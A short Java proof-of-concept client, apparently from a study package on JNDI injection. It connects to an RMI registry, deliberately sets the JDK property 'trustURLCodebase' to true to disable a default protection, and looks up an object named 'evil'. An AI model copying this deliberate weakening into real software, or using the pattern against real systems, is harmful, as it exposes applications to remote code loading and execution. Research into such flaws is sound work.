package org.lain.poc.jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

/**
 * @author: ZH3FENG
 * @Date: 下午8:44 2017/12/11
 * @Modified By:
 * @Description:模拟从指定的register查找对象
 */
public class Client {

    public static void main(String[] args) throws NamingException {


        /*初始化*/
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1090");//localhost
        //env.put(Context.PROVIDER_URL, "rmi://xx.xx.xx.xx:1090");//remote
        Context ctx = new InitialContext(env);

        /*JDK1.8xx trustURLCodebase默认是false*/
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        System.out.println(ctx.lookup("evil"));
    }
}
